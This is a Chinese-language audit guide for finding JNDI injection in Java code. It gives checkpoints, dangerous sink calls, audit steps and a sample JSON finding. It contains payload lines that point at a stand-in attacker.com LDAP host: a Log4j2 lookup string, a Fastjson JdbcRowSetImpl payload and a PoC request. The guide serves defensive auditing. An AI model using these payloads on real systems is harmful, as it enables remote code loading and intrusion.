# JNDI注入审计分支

## 触发条件

- 标签: `JNDI_LOOKUP`
- 优先级: 1（高危）

## 审计检查点

| 检查项 | 说明 |
|--------|------|
| JNDI1 | `lookup()` 参数是否来自用户可控输入？ |
| JNDI2 | 是否限制JNDI协议为`java:`（本地命名空间）？ |
| JNDI3 | 是否配置`com.sun.jndi.ldap.object.trustURLCodebase=false`？ |
| JNDI4 | JDK版本是否 >= 8u191（默认禁用远程类加载）？ |
| JNDI5 | 是否使用白名单验证JNDI名称？ |

## 危险Sink清单

```java
// 直接调用
InitialContext.lookup(userInput)
JndiTemplate.lookup(userInput)
ctx.lookup(userInput)

// 间接调用
JdbcRowSetImpl.setDataSourceName(userInput)
// Fastjson: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://..."}

// 日志框架
Log4j2 ${jndi:ldap://attacker.com/exploit}
```

## 审计流程

```
1. 定位JNDI lookup Sink点
2. 反向追踪lookup参数来源
3. 检查JDK版本（影响远程类加载）
4. 检查是否存在协议限制
5. 检查是否存在名称白名单
6. 使用LSP确认参数可控性
7. 生成漏洞报告或标记为安全
```

## 回溯请求触发条件

- JNDI名称来自配置文件 → 检查配置修改权限
- JNDI名称来自数据库 → 追踪写入来源

## 输出格式

```json
{
  "branch": "jndi",
  "findings": [
    {
      "type": "JNDI注入",
      "severity": "CRITICAL",
      "sink": "DataSourceService.java:45",
      "source": "ConfigController.java:22 @RequestParam",
      "evidence": "new InitialContext().lookup(jndiName)",
      "jdk_version": "8u181 (远程类加载未禁用)",
      "sanitization": "无协议限制，无名称白名单",
      "poc": "GET /api/ds?name=ldap://attacker.com/exploit"
    }
  ]
}
```
